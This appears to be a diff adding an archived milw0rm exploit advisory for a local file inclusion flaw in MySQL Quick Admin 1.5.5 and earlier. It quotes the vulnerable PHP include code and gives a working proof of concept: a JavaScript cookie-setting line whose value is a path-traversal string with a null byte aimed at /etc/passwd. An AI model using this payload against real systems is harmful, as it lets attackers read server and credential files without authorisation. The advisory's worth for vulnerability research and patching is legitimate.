@@ -1,0 +1,42 @@
+# MySQL Quick Admin <= 1.5.5 (COOKIE) Local File Inclusion Vulnerability
+# url: http://www.mysqlquickadmin.com/
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+# Greetz To: Pepelux :)
+#
+# *Requirements: magic_quotes_gpc = Off
+
+vuln file: /includes/required.php
+vuln code: 
+
+if(!empty($_COOKIE['language']) && !isset($_SESSION['language'])){
+	$_SESSION['language'] = $_COOKIE['language'];
+}
+
+....
+
+if(LANG == ""){
+	if(!isset($_SESSION['language'])){
+		include("lang/english/lang.php");
+		$_LANG = "english";
+	} else {
+		include("lang/".$_SESSION['language']."/lang.php");
+		$_LANG = $_SESSION['language'];
+	}
+
+... }
+
+LFI (poc): 
+1) javascript:document.cookie="language=../../../../../../../../../../etc/passwd%00; path=/";
+2) and enters /index.php
+
+Ingenious work :D
+
+# milw0rm.com [2008-10-01]
